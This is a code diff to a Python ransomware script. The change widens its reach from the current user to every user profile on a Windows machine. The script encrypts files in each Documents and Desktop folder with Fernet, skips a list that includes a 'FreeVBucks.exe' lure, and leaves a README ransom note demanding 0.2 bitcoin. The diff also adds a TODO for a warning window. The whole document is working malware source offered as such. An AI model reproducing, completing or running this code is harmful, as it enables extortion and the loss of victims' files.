@@ -1,17 +1,40 @@
-import getpass
 import os
 from cryptography.fernet import Fernet
 
 
+# TODO WINDOW WITH WARNING AND KEY
+
+
 def main():
-    username = getpass.getuser()
-    directories = [f'C:\\Users\\{username}\\Desktop', f'C:\\Users\\{username}\\Documents']
-    ignore = ['desktop.ini', 'A Minha Música', 'Os Meus Vídeos', 'As Minhas Imagens', 'FreeVBucks.exe']
+    backslash = "\\"
+    base_path = "C:" + backslash + "Users"
+    ignore = ['A Minha Música', 'Os Meus Vídeos', 'As Minhas Imagens', 'FreeVBucks.exe', "All Users", "Default",
+              "Default User", "desktop.ini", "Public"]
     key = Fernet.generate_key()
     f = Fernet(key)
 
+    users = get_users(base_path, backslash, ignore)
+    directories = set_directories(users, backslash)
     loop(directories, ignore, f)
-    write_readme(username, key.decode())
+    write_readme(users[0], key.decode())
+
+
+def get_users(base_path: str, backslash: str, ignore: list[str]):
+    users = []
+    for dir in os.listdir(base_path):
+        if dir in ignore:
+            continue
+        else:
+            users.append(base_path + backslash + dir)
+    return users
+
+
+def set_directories(users: list[str], backslash: str):
+    directories = []
+    for user in users:
+        directories.append(user + backslash + "Documents")
+        directories.append(user + backslash + "Desktop")
+    return directories
 
 
 def loop(directories: list[str], ignore: list[str], f: Fernet):
@@ -20,6 +43,7 @@ def loop(directories: list[str], ignore: list[str], f: Fernet):
         for directory in directories:
             if os.path.exists(directory) and os.path.isdir(directory):
                 for file in os.listdir(directory):
+                    print(file)
                     if file in ignore:
                         continue
                     if os.path.isfile(directory + "\\" + file):
@@ -44,10 +68,9 @@ def magic(content, file_path: str, f: Fernet):
 
 
 def write_readme(username: str, key: str):
-    with open(f'C:\\Users\\{username}\\Desktop\\README.txt', "w") as file:
+    with open(username + "\\" + "Desktop" + "\\" + "README.txt", "w") as file:
         file.write(
             f'Your files have been encrypted, send 0.2 bitcoin to my bank account, and I will give you the decryptor. KEY: {key}')
 
-
-if __name__ == "__main__":
-    main()
+# if __name__ == "__main__":
+#     main()
